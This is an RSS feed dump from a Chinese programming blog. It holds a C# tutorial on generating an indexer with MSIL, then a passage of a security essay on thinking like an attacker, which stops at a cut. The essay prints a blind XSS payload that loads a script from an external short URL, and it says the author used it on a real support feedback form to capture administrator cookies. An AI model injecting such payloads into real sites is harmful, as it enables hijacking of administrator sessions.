<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>MSIL实用指南-生成索引器 - Z语言</title>
<link>http://www.cnblogs.com/tkt2016/p/8651403.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tkt2016/p/8651403.html</guid>
<description>&lt;p&gt;MSIL实用指南-生成索引器&lt;/p&gt;
&lt;p&gt;索引器是一种特殊的属性，它有参数的，也有get和set方法，属性名称一般是&quot;Item&quot;,并且方法名称一般名称是&quot;get_Item&quot;和&quot;set_Item&quot;。&lt;/p&gt;
&lt;p&gt;下面我们来生成如下的带有索引器的类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;&lt;img id=&quot;code_img_closed_ed4afd96-4819-4aff-bf37-bca125836d04&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_ed4afd96-4819-4aff-bf37-bca125836d04&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ed4afd96-4819-4aff-bf37-bca125836d04&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;63&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; LX1_ILDemo
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; IndexerDemo
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt;[,] _CustomerNames;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;[&lt;span&gt;int&lt;/span&gt;, &lt;span&gt;int&lt;/span&gt;&lt;span&gt;]
        {
            &lt;/span&gt;&lt;span&gt;get&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;._CustomerNames[num, num2];
            }
            &lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;._CustomerNames[num, num2] =&lt;span&gt; value;
            }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;第一步,生成一个字段&lt;/strong&gt;&lt;br/&gt;生成字段用TypeBuilder.DefineField方法。&lt;br/&gt;实例代码：&lt;br/&gt;FieldBuilder CustomerNamesBldr = typeBuilder.DefineField&lt;br/&gt;(&quot;_CustomerNames&quot;,typeof(string[,]),FieldAttributes.Private);&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二步,创建一个名称为Item的PropertyBuilder对象&lt;/strong&gt;&lt;br/&gt;创建PropertyBuilder对象需要用生成字段用方法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
PropertyBuilder custNamePropBldr =&lt;span&gt; typeBuilder.DefineProperty
(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, PropertyAttributes.HasDefault,&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;),&lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;) });
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;注意定义这个PropertyBuilder对象是有参数new Type[] { typeof(int), typeof(int) }的。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;&lt;strong&gt;第三步,生成get和set方法&lt;/strong&gt;&lt;br/&gt;方法名为&quot;get_Item&quot;和&quot;set_Item&quot;。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;55&quot;&gt;
&lt;pre&gt;
MethodAttributes getSetAttr =&lt;span&gt;
MethodAttributes.Public &lt;/span&gt;| MethodAttributes.SpecialName |&lt;span&gt; MethodAttributes.HideBySig;

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义get方法&lt;/span&gt;
MethodBuilder custNameGetPropMthdBldr =&lt;span&gt;
typeBuilder.DefineMethod(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;get_Item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, getSetAttr, &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;) , &lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;) });

ILGenerator ilGetGenerator &lt;/span&gt;=&lt;span&gt; custNameGetPropMthdBldr.GetILGenerator();
LocalBuilder localBuilderv1 &lt;/span&gt;= ilGetGenerator.DeclareLocal(&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;));
ilGetGenerator.Emit(OpCodes.Ldarg_0);
ilGetGenerator.Emit(OpCodes.Ldfld, CustomerNamesBldr);
ilGetGenerator.Emit(OpCodes.Ldarg_1);
ilGetGenerator.Emit(OpCodes.Ldarg_2);
ilGetGenerator.Emit(OpCodes.Call ,&lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;[,]).GetMethod(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Get&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;) }));
ilGetGenerator.Emit(OpCodes.Stloc_0);
ilGetGenerator.Emit(OpCodes.Ldloc_0);
ilGetGenerator.Emit(OpCodes.Ret);

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义set方法&lt;/span&gt;
MethodBuilder custNameSetPropMthdBldr =&lt;span&gt;
typeBuilder.DefineMethod(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;set_Item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, getSetAttr, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;) });

ILGenerator ilSetGenerator &lt;/span&gt;=&lt;span&gt; custNameSetPropMthdBldr.GetILGenerator();
ilSetGenerator.Emit(OpCodes.Ldarg_0);
ilSetGenerator.Emit(OpCodes.Ldfld, CustomerNamesBldr);
ilSetGenerator.Emit(OpCodes.Ldarg_1);
ilSetGenerator.Emit(OpCodes.Ldarg_2);
ilSetGenerator.Emit(OpCodes.Ldarg_3);
ilSetGenerator.Emit(OpCodes.Call, &lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;[,]).GetMethod(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Set&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;) }));
ilSetGenerator.Emit(OpCodes.Ret);

custNamePropBldr.SetGetMethod(custNameGetPropMthdBldr);
custNamePropBldr.SetSetMethod(custNameSetPropMthdBldr);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;第四步,给类加DefaultMemberAttribute特性&lt;/strong&gt;&lt;br/&gt;用反射查找DefaultMemberAttribute类型，传入参数值为&quot;Item&quot;，创建一个DefaultMemberAttribute实例，&lt;br/&gt;源码如下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
Type myType = &lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(DefaultMemberAttribute);
ConstructorInfo infoConstructor &lt;/span&gt;= myType.GetConstructor(&lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;) });
CustomAttributeBuilder attributeBuilder &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; CustomAttributeBuilder(infoConstructor, &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;[] {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
typeBuilder.SetCustomAttribute(attributeBuilder);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;完整程序如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;&lt;img id=&quot;code_img_closed_0bd71fed-b683-489e-80ce-8e099a4d4e31&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_0bd71fed-b683-489e-80ce-8e099a4d4e31&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_0bd71fed-b683-489e-80ce-8e099a4d4e31&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;91&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Reflection;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Reflection.Emit;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; LX1_ILDemo
{
    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Demo12_Indexer
    {
        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; binaryName = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Demo12_Indexer.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; namespaceName = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LX1_ILDemo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; typeName = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;IndexerDemo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt;&lt;span&gt; AssemblyBuilder assemblyBuilder;
        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt;&lt;span&gt; ModuleBuilder moduleBuilder;
        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt;&lt;span&gt; TypeBuilder typeBuilder;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt;  Generate_Indexer()
        {
            FieldBuilder CustomerNamesBldr &lt;/span&gt;=&lt;span&gt; typeBuilder.DefineField
                (&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;_CustomerNames&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;[,]),FieldAttributes.Private);

            PropertyBuilder custNamePropBldr &lt;/span&gt;=&lt;span&gt; typeBuilder.DefineProperty
                (&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, PropertyAttributes.HasDefault,&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;),&lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;) });

            MethodAttributes getSetAttr &lt;/span&gt;=&lt;span&gt;
                MethodAttributes.Public &lt;/span&gt;| MethodAttributes.SpecialName |&lt;span&gt; MethodAttributes.HideBySig;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义get方法&lt;/span&gt;
            MethodBuilder custNameGetPropMthdBldr =&lt;span&gt;
                typeBuilder.DefineMethod(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;get_Item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, getSetAttr, &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;) , &lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;) });

            ILGenerator ilGetGenerator &lt;/span&gt;=&lt;span&gt; custNameGetPropMthdBldr.GetILGenerator();
            LocalBuilder localBuilderv1 &lt;/span&gt;= ilGetGenerator.DeclareLocal(&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;));
            ilGetGenerator.Emit(OpCodes.Ldarg_0);
            ilGetGenerator.Emit(OpCodes.Ldfld, CustomerNamesBldr);
            ilGetGenerator.Emit(OpCodes.Ldarg_1);
            ilGetGenerator.Emit(OpCodes.Ldarg_2);
            ilGetGenerator.Emit(OpCodes.Call ,&lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;[,]).GetMethod(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Get&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;) }));
            ilGetGenerator.Emit(OpCodes.Stloc_0);
            ilGetGenerator.Emit(OpCodes.Ldloc_0);
            ilGetGenerator.Emit(OpCodes.Ret);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义set方法&lt;/span&gt;
            MethodBuilder custNameSetPropMthdBldr =&lt;span&gt;
                typeBuilder.DefineMethod(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;set_Item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, getSetAttr, &lt;span&gt;null&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;) });

            ILGenerator ilSetGenerator &lt;/span&gt;=&lt;span&gt; custNameSetPropMthdBldr.GetILGenerator();
            ilSetGenerator.Emit(OpCodes.Ldarg_0);
            ilSetGenerator.Emit(OpCodes.Ldfld, CustomerNamesBldr);
            ilSetGenerator.Emit(OpCodes.Ldarg_1);
            ilSetGenerator.Emit(OpCodes.Ldarg_2);
            ilSetGenerator.Emit(OpCodes.Ldarg_3);
            ilSetGenerator.Emit(OpCodes.Call, &lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;[,]).GetMethod(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Set&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;), &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;) }));
            ilSetGenerator.Emit(OpCodes.Ret);

            custNamePropBldr.SetGetMethod(custNameGetPropMthdBldr);
            custNamePropBldr.SetSetMethod(custNameSetPropMthdBldr);

            SetTypeAttr();
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; SetTypeAttr()
        {
            Type myType &lt;/span&gt;=  &lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(DefaultMemberAttribute);
            ConstructorInfo infoConstructor &lt;/span&gt;= myType.GetConstructor(&lt;span&gt;new&lt;/span&gt; Type[] { &lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;) });
            CustomAttributeBuilder attributeBuilder &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; CustomAttributeBuilder(infoConstructor, &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;[] {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
            typeBuilder.SetCustomAttribute(attributeBuilder);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Generate()
        {
            InitAssembly();

            typeBuilder &lt;/span&gt;= moduleBuilder.DefineType( namespaceName+&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;+&lt;span&gt; typeName, TypeAttributes.Public);
            Generate_Indexer();

            SaveAssembly();
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;生成成功&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; InitAssembly()
        {
            AssemblyName assemblyName &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; AssemblyName(namespaceName);
            assemblyBuilder &lt;/span&gt;=&lt;span&gt; AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.RunAndSave);
            moduleBuilder &lt;/span&gt;=&lt;span&gt; assemblyBuilder.DefineDynamicModule(assemblyName.Name, binaryName);
        }

        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; SaveAssembly()
        {
            Type t &lt;/span&gt;= typeBuilder.CreateType(); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;完成Type，这是必须的&lt;/span&gt;
&lt;span&gt;            assemblyBuilder.Save(binaryName);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;

</description>
<pubDate>Mon, 26 Mar 2018 07:31:00 +0000</pubDate>
<dc:creator>Z语言</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tkt2016/p/8651403.html</dc:identifier>
</item>
<item>
<title>【黑客浅析】像黑客一样思考 - 腾讯云+社区</title>
<link>http://www.cnblogs.com/qcloud1001/p/8651368.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qcloud1001/p/8651368.html</guid>
<description>&lt;p&gt;欢迎大家前往&lt;a href=&quot;https://cloud.tencent.com/developer/&quot; target=&quot;_blank&quot;&gt;腾讯云&lt;/a&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/&quot; target=&quot;_blank&quot;&gt;+社区&lt;/a&gt;，获取更多腾讯海量技术实践干货哦&lt;span lang=&quot;EN-US&quot;&gt;~&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;3.3695652173913&quot;&gt;
&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;作者：由&lt;a class=&quot;author-name&quot; href=&quot;https://cloud.tencent.com/developer/user/609151&quot;&gt;云鼎实验室&lt;/a&gt;发表在云+社区&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;网络安全里经常说的一句话是未知攻焉知防，基本所有的安全人员也是一名黑客，在黑客攻击愈发普遍的今天，如何更好的防御黑客攻击？用句带有点哲学的话，成为黑客，只有成为黑客，像黑客一样思考，你才能知道从哪去防御黑客；很俗的一句话，但很实在！&lt;/p&gt;
&lt;p&gt;看到了什么？&lt;/p&gt;
&lt;div class=&quot;image-block&quot;&gt;&lt;img src=&quot;https://blog-10039692.file.myqcloud.com/1492775582226_5870_1492775582604.jpg&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;看到上图的第一直觉，你可以自己想下答案，问问自己看到了什么？&lt;/p&gt;
&lt;p&gt;正常的思维，第一直观感受是中间那个很明显，很大的黑点，因为这个黑点最吸引大家的注意力，稍微看过一些哲学故事的同学可能会想到黑点周围白色的区域，是的，黑点只是其中一个小点，而黑点周围白色的部分则足够大；但是，我不知道有没有人的答案是白色再外面？文章区域再外面？或者整个浏览器？整个电脑屏幕？电脑外呢？其实想表达的也正是黑客的思维里，永远不是局限于可以看到的部分，而在于能够想到或者没想到的所有面。&lt;/p&gt;
&lt;p&gt;其实这类同于攻击面！安全是木桶短板原理，木桶能装多少水不在于最长的那块板，而是最短的那块；而一个系统的安全程度不取决于安全做的多全，做的多高大上，而在于是否把那些最简单的问题处理掉？数据告诉我们，服务器入侵，除了漏洞之外最大途径是弱口令，而这就是一个根本没多少技术含量的方式，属于安全基线问题，就是同样的道理。对于黑客而言，攻击面不会局限于能够看到的点，而在于所有可能关联或者没关联的面，就比如渗透测试或者说APT，很多时候结合社工这个点能够取得很好的效果，成为一个绝佳的入侵渠道。所以，第一点，学会放开自己的思维与想象，发现和关注平时所容易忽略和没有看到的地方。&lt;/p&gt;
&lt;p&gt;什么是黑客？&lt;/p&gt;
&lt;p&gt;什么是黑客？我用八个字总结，突破创造，守正出奇。在我看来，黑客永远不是一个贬义词，黑客本身就是极客，对于黑客来说，这个世界充满好奇，这个世界有太多的东西可以探索，特别是网络的世界。&lt;/p&gt;
&lt;div class=&quot;image-block&quot;&gt;&lt;img src=&quot;https://blog-10039692.file.myqcloud.com/1492775617786_1977_1492775618151.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;image-block&quot;&gt;&lt;img src=&quot;https://blog-10039692.file.myqcloud.com/1492775634792_3693_1492775635609.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;黑客是一个追求自由的群体，不喜欢受到条条框框的约束，总是喜欢突破这一切，突破同时也可能是一种创造，创造新的方法，新的方式，新的工具，新的东西，就比如上图，小学课本里的乌鸦喝水，在我们看来是一种很傻的行为，但未尝不是一种稳定传统的方式？在生活中很多的事不也正如此？或者说就网络上很多安全的措施有时候也是稳定起见，因为新的东西除了先进，有时候也会带来风险。而对于黑客来说，可能考虑的更不是这些，而是尝试，好奇一切。&lt;/p&gt;
&lt;p&gt;对于黑客而言，也有自己的黑客精神，有自己要坚持和秉承的东西（地下黑客的原则可能不同于正常黑客），这就是守正，自由、共享、平等、互助；在Web安全的世界里，我们经常会提到一个词&quot;猥琐&quot;，或者说不仅限于Web安全，因为很多时候攻击的产生不是利用一个多厉害的漏洞，而在于猥琐的思路，几个定义为低危的小漏洞的组合也许威力比一个高危漏洞还大，这就取决于漏洞的组合使用，利用思路；这些&quot;猥琐行为&quot;就是一种出奇的表现。&lt;/p&gt;
&lt;p&gt;了解黑客，成为黑客，才能更好的学会黑客的思考。&lt;/p&gt;
&lt;p&gt;看到框就想X&lt;/p&gt;
&lt;div class=&quot;image-block&quot;&gt;&lt;img src=&quot;https://blog-10039692.file.myqcloud.com/1492775670190_7284_1492775670490.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;这是一个意见反馈的界面，看到这样一个界面，大家会怎么做？对于普通人来说，这就是一个正常的意见提交框，用处就是提交反馈内容；大家想想黑客会怎么做？提交攻击代码，比如下面的代码：&lt;/p&gt;
&lt;pre class=&quot;prism-token token language-javascript&quot;&gt;
&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;span class=&quot;token operator&quot;&gt;/textarea&lt;span class=&quot;token operator&quot;&gt;&amp;gt;'&quot;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;script src&lt;span class=&quot;token operator&quot;&gt;=http&lt;span class=&quot;token punctuation&quot;&gt;:&lt;span class=&quot;token operator&quot;&gt;/&lt;span class=&quot;token operator&quot;&gt;/t&lt;span class=&quot;token punctuation&quot;&gt;.cn&lt;span class=&quot;token operator&quot;&gt;/R63bUP9&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;span class=&quot;token operator&quot;&gt;/script&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;实际上，当时看到这样一个功能，我就这样做了。这是360手游客服中心手机版的一个页面，可以提交反馈意见，我当时就直接提交了上面的攻击代码，然后就攻击成功了（这其实是一次XSS盲打，什么是XSS盲打大家可以自行搜索或者看我之前发的文章）。由于这样的功能往往看反馈内容的都是系统的相关管理员，于是被攻击成功的也是管理员，通过XSS盲打可以直接拿到管理员登录的账号的Cookie等信息（下图就是盲打平台中收到的攻击成功返回的后台地址和管理员Cookie）。&lt;/p&gt;
&lt;div class=&quot;image-block&quot;&gt;&lt;img src=&quot;https://blog-10039692.file.myqcloud.com/1492775786972_319_1492775787647.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;当然，不仅限于这个页面，还有其他的：&lt;/p&gt;
&lt;div class=&quot;image-block&quot;&gt;&lt;img src=&quot;https://blog-10039692.file.myqcloud.com/1492775842759_3406_1492775843347.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;这种行为总结而言，就是&quot;看到框就想X&quot;，这里的X也就是XSS的意思；其实这更多的是一种习惯和意识，在黑客的想法里，看到功能首先想到的不是使用，而是能不能利用，然后由于攻击做的多了，看到不同的功能和应用页面，自然就能意识到可能存在的问题，自然而然的就会去测试；经常会有很多人问，那些人在各种SRC提交的漏洞都是怎么挖的，是不是有神器？但是也不是每个人的安全测试工具都是神器啊！其实很多时候是在使用中发现漏洞！&lt;/p&gt;
&lt;p&gt;不同的潜意识行为和想法，取决于不同的知识面和经验，也取决于不同的目的。&lt;/p&gt;
&lt;p&gt;功能也是攻击方式&lt;/p&gt;
